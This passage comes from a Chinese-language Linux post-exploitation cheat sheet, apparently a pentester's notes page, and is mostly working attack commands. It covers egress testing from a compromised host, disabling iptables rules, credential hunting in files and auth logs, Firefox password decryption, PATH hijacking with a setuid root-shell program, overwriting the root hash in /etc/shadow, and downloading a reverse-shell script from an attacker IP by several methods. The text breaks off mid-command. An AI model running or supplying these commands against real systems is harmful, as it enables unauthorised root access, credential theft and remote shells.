+<ul>
+<li>egressbuster</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Manual</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## From my pc</span></span> <br>sudo tcpdump -i tun0 tcp[13]==2<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## From compromise machine</span></span><br>nc -nzv -w 1 &lt;MyIP&gt; 1-1000<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| From TrustedSec Script</span></span><br>git clone https://github.com/trustedsec/egressbuster.git &amp;&amp; cd egressbuster<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## From my pc</span></span> <br>python3 egress_listener.py &lt;your_local_ip&gt; &lt;interface_for_listener&gt; 0.0.0.0/0 <br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## From compromise machine</span></span><br>python3 egressbuster.py &lt;your_local_ip&gt; 1-65536<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>IP表</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| IPTable</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Active rules [need access]</span></span><br>iptables -L<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Using file</span></span><br>ls /etc/iptables/<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## for IPV4</span></span><br>cat ls /etc/iptables/rules.v4<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## for IPV6</span></span><br>cat ls /etc/iptables/rules.v6<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Remove all rules</span></span><br>iptables-save &gt; /dev/shm/fbashirewall.rules<br>iptables -P INPUT ACCEPT<br>iptables -P OUTPUT ACCEP<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## OpenBSD (pf)</span></span><br>find /etc/authpf<br>/etc/authpf/authpf.conf<br>/etc/authpf/authpf.rules<br></code></pre></td></tr></table></figure>
+
+<h3 id="01-5-文件-目录枚举"><a href="#01-5-文件-目录枚举" class="headerlink" title="01.5 文件&#x2F;目录枚举"></a>01.5 文件&#x2F;目录枚举</h3><ul>
+<li>常见的</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出具有高级选项的文件</span></span><br>ls -laSrh   # sort by size<br>ls -lacrh   # sort by change time<br>ls -laurh   # sort by access time<br>ls -laRh    # recursive ls<br>ls -latrh   # sort by date<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列表属性</span></span><br>lsattr &lt;DirectoryName&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 获取文件访问控制列表</span></span><br>getfacl &lt;DirectoryName&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出带有目录的文件</span></span><br>find . -type f -ls 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出包含子目录的文件</span></span><br>find . -ls -type f 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出所有具有行数的文件</span></span><br>find -type f -exec wc -l &#123;&#125; \; 2&gt;/dev/null | sort -nr<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 历史文件中有什么？</span></span><br>cat ~/.*history | less<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 上次修改的文件</span></span><br>find $1 -type f -exec stat --format &#x27;%Y :%y %n&#x27; &quot;&#123;&#125;&quot; \; | sort -nr | cut -d: -f2- | head<br>find $1 -type f -print0 | xargs -0 stat --format &#x27;%Y :%y %n&#x27; | sort -nr | cut -d: -f2- | head<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>SUID&#x2F;SGID</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出所有SUID二进制文件</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 正常搜索</span></span><br>find / -perm -4000 -ls 2&gt;/dev/null<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## 按日期排序</span></span><br>find / -perm -4000 -printf &quot;%T@\t%Tc %6k KiB %p\n&quot; 2&gt;/dev/null | sort -n | cut -f 2-   <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出所有SGID二进制文件</span></span><br>find / -perm -2000 -ls 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>查找硬编码凭据。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">export GREP_COLOR=&#x27;1;37;41&#x27;<br>grep --color=always -RiE &#x27;(password|pwd|pass)&#x27; . --exclude=\*.&#123;css,js,md&#125; 2&gt;/dev/null<br>grep --color=always -RiE &#x27;(password|pwd|pass)[[:space:]]*=[[:space:]]*[[:alpha:]]+&#x27; *  2&gt;/dev/null<br>grep --color=always -Rnw &#x27;/&#x27; -ie &quot;PASSWORD\|PASSWD&quot; –color=always 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>查找复杂的</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列表文件属于当前组/用户</span></span><br>find / -user $(whoami) -ls 2&gt;/dev/null<br>find / -group $(groups) -ls 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 如果您在多个组中</span></span><br>for i in $(groups);do find / -group $i -ls 2&gt;/dev/null | grep -v &#x27; /proc\| /run\| /sys&#x27;;done<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 以上带有过滤器的命令</span></span><br>find / -user $(whoami) -ls 2&gt;/dev/null | grep -v &#x27; /proc\| /run\| /sys&#x27;<br>find / -group $(groups) -ls 2&gt;/dev/null | grep -v &#x27; /proc\| /run\| /sys&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 查找根目录可写文件夹</span></span><br>find / -writable -type d -ls 2&gt;/dev/null<br>find / -perm -222 -type d -ls 2&gt;/dev/null<br>find / -perm -o w -type d -ls 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 查找根目录可执行文件夹</span></span><br>find / -perm -o x -type d -ls 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 查找属于根目录而不是全局可读的可读文件</span></span><br>find / -type f -user root ! -perm -o=r ! -path &quot;/proc/*&quot; 2&gt;/dev/null | grep -v &quot;/sys\|/boot\|/var\|/etc/\|/run&quot;  <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 列出所有具有权限/所有者[美化]的文件</span></span><br>find . -type f -printf &quot;%f\t%p\t%u\t%g\t%m\n&quot; 2&gt;/dev/null | column -t<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 查找在过去10天内修改的文件</span></span><br>find / -mtime 10 -ls 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 查找过去10天内访问的文件</span></span><br>find / -atime 10 -ls 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 查找在过去一小时（60分钟）内更改的文件</span></span><br>find / -cmin -60 -ls 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 查找最后一小时（60分钟）内的文件访问</span></span><br>find / -amin -60 -ls 2&gt;/dev/null <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 用户放置的二进制文件[有趣]</span></span><br>for i in /usr/sbin /usr/bin /sbin /bin; do ls -la --time-style=full $i | grep -v &#x27;000000000\|-&gt;&#x27; ; done    <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 查找日期之间的修改文件。</span></span><br>find / -newermt &quot;2021-11-21&quot; ! -newermt &quot;2021-12-21&quot; -ls 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 检查包含密码或用户名关键字的文件</span></span><br>grep --color=auto -rnw &#x27;/&#x27; -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null<br>grep --color=auto -rnw &#x27;/etc&#x27; -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/null<br>grep --color=auto -rnw &#x27;/etc&#x27; -ie &quot;USERNAME&quot; --color=always 2&gt; /dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 检查ssh主机密钥值</span></span><br>ssh-keygen -l -E md5 -f /etc/ssh/ssh_host_rsa_key.pub<br>ssh-keygen -l -E md5 -f /etc/ssh/ssh_host_ecdsa_key.pub<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>共享对象注入</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">strace /path/to/file 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>列出 noexec 挂载</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mount | grep noexec<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>PATH</code>环境变量</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| checking</span></span><br>strings /path/to/file<br>strace -v -f -e execve /path/to/file 2&gt;&amp;1 | grep exec<br>ltrace /path/to/file<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Create vul file</span></span><br>int main() &#123;<br>    setuid(0);<br>    system(&quot;/bin/bash -p&quot;);<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Execute</span></span><br>PATH=.:$PATH /path/to/file<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| If bash &lt; 4.2-048 we can inject to absolute path aswell.</span></span><br>strace -v -f -e execve /path/to/file 2&gt;&amp;1<br>function /path/to/service &#123; /bin/bash -p; &#125;<br>export -f /path/to/service<br>/path/to/file<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>读取审核文件</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| If you are in adm group</span></span><br>aureport<br>aureport --help<br>aureport --tty<br><br>cat /var/log/auth.* | grep &quot;Failed password&quot;<br>cat /var/log/auth.* | grep -oE &quot;([0-9]&#123;1,3&#125;[\.])&#123;3&#125;[0-9]&#123;1,3&#125;&quot; | sort | uniq -c<br>cat /var/log/auth.* | grep &quot;password&quot; | grep -v &#x27;Failed\|Invalid&#x27;<br>cat /var/log/auth.* | grep -i &#x27;root\|user\|usern\|passw\|pass\|`$(whoami)`&#x27; | awk -F: &#x27;&#123;print $5&#125;&#x27; | sort | uniq -c <br>cat /var/log/syslog* | grep -i &#x27;root\|user\|`$(whoami)`\|cron&#x27; |awk -F: &#x27;&#123;print $5&#125;&#x27; | sort | uniq -c<br>awk &#x27;&#123;if($6==&quot;Failed&quot;&amp;&amp;$7==&quot;password&quot;)&#123;if($9==&quot;invalid&quot;)&#123;ips[$13]++;users[$11]++&#125;else&#123;users[$9]++;ips[$11]++&#125;&#125;&#125;END&#123;for(ip in ips)&#123;print ip, ips[ip]&#125;&#125;&#x27; /var/log/auth.* | sort -k2 -rn     <br>awk &#x27;&#123;if($6==&quot;Failed&quot;&amp;&amp;$7==&quot;password&quot;)&#123;if($9==&quot;invalid&quot;)&#123;ips[$13]++;users[$11]++&#125;else&#123;users[$9]++;ips[$11]++&#125;&#125;&#125;END&#123;for(user in users)&#123;print user, users[user]&#125;&#125;&#x27; /var/log/auth.* | sort -k2 -rn      <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Grep username and password</span></span><br>sed -n &#x27;s/.*username=\([^&amp;]*\).*password=\([^&amp;]*\).*/\1:\2/p&#x27; logfile.txt<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>恢复文件</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Using foremost</span></span> <br>sudo apt-get install foremost <br>mkdir /tmp/recov<br>sudo foremost -q -v -i /dev/sda1 -t &lt;jpeg,txt,..&gt; -o /tmp/recov<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-v  - 详细模式。将所有消息记录到屏幕</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-q  - 启用快速模式。在512字节的边界上执行搜索。</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-t  - 指定文件类型。（-t jpeg、pdf…）</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-d  - 启用间接块检测（对于UNIX文件系统）</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-i  - 指定输入文件（默认为stdin）</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-o  - 设置输出目录（默认为输出）</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-Q  - 启用安静模式。抑制输出消息。</span> <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 使用lsof[在inode仍处于活动状态时有效]</span></span><br>lsof | grep -i deletedFile.txt<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>解密 Mozilla Firefox 受保护的密码</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/lclevy/</span>firepwd.git<br><br>python firepwd.py -d <span class="hljs-regexp">/c/</span>Users<span class="hljs-regexp">/..../</span>Profiles/<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>ZipSlip 博览会</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ln -s ../../../../../../etc/passwd document.pdf<br>zip expo.zip document.pdf <br></code></pre></td></tr></table></figure>
+
+<h3 id="01-6-软件-包枚举"><a href="#01-6-软件-包枚举" class="headerlink" title="01.6 软件&#x2F;包枚举"></a>01.6 软件&#x2F;包枚举</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| List all installed packages</span></span><br>dpkg -l<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Search for compilers</span></span><br>dpkg --list 2&gt;/dev/null | grep &quot;compiler&quot; | grep -v &quot;decompiler\|lib&quot; 2&gt;/dev/null || yum list installed &#x27;gcc*&#x27; 2&gt;/dev/null | grep gcc 2&gt;/dev/null; command -v gcc g++ 2&gt;/dev/null || locate -r &quot;/gcc[0-9\.-]\+$&quot; 2&gt;/dev/null | grep -v &quot;/doc/&quot;       <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Mysql version</span></span><br>mysql --version 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<h3 id="01-7-活动目录"><a href="#01-7-活动目录" class="headerlink" title="01.7 活动目录"></a>01.7 活动目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 是否检查域已加入？</span></span><br>cat /etc/krb5.conf<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 搜索凭据/票证</span></span><br>find / -name *.keytab 2&gt;/dev/null<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Request a TGT</span></span><br>kinit &lt;User&gt;@&lt;Domain&gt; -k -t domain.keytab<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Check current tickets</span></span><br>klist<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| 请求子域控制器的CIFS票证</span></span><br>kvno cifs\/OPS-ChildDC<br></code></pre></td></tr></table></figure>
+
+<h3 id="01-8-其他"><a href="#01-8-其他" class="headerlink" title="01.8 其他"></a>01.8 其他</h3><ul>
+<li>创建带有特殊字符的文件</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">touch -- &#x27;echo | hello&#x27;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>通过替换文件更改root密码<code>/etc/shadow</code>。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Create password</span></span> <br>openssl passwd -6 -salt h4rithd h4rithd123<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## -1 --&gt; MD5</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## -5 --&gt; SHA256</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## -6 --&gt; SHA512</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## also you can use it with out salt flag</span></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Replace the password in /etc/shadow (h4rithd123)</span></span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">6$h4rithd<span class="hljs-variable">$SjZ3XkShHfK9x1Rpn9RhhDH030H4cy</span>.igvwhXGoAb93wEUM9AGR5fjR6ms/oqCqhkopN9Wj/ORX/SlUoaypYI0</span><br><br>sed -i -E &#x27;s/^([^:]+:)([^:]+)(..+)$/\1PASSWORD\3/g&#x27; /etc/shadow<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| one line : h4rithd123</span></span><br>sed -i -E &#x27;s/^([^:]+:)([^:]+)(..+)$/\1$6$\/dij\/aLbpn4NJrUW$iNXC\/blQ8FP6.kgZmpazax0RNiKBRRVwTuH5e2UFaYUQo8XOKb9aQU8hM7.e2I3omzD4Mp4XRHHzk0B2txbBW\/\3/g&#x27; /etc/shadow    <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>下载文件。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| WGET</span></span><br>wget https://10.10.14.25/revshell.sh -O /tmp/revshell.sh<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| CURL</span></span><br>curl -o /tmp/revshell.sh https://10.10.14.25/revshell.sh<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| OpenSSL</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Create certificate</span></span><br>openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem     <br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Stand up server</span></span><br>openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/revshell.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Download file</span></span><br>openssl s_client -connect 10.10.14.25:80 -quiet &gt; revshell.sh<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| Bash (/dev/tcp)</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Connect to Target&#x27;s Webserver</span></span><br>exec 3&lt;&gt;/dev/tcp/10.10.10.32/80<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## HTTP GET Request</span></span><br>echo -e &quot;GET /revshell.sh HTTP/1.1\n\n&quot;&gt;&amp;3<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Print the Response</span></span><br>cat &lt;&amp;3<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># ------------------| PHP</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## File_get_contents()</span></span><br>php -r &#x27;$file = file_get_contents(&quot;https://10.10.14.25/revshell.sh&quot;); file_put_contents(&quot;revshell.sh&quot;,$file);&#x27;       <br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">## Fopen()</span></span><br>php -r &#x27;const BUFFER = 1024; $fremote = fopen(&quot;https://10.10.14.25/revshell.sh&quot;, &quot;rb&quot;); $flocal = fopen(&quot;revshell.sh&quot;, &quot;wb&quot;); 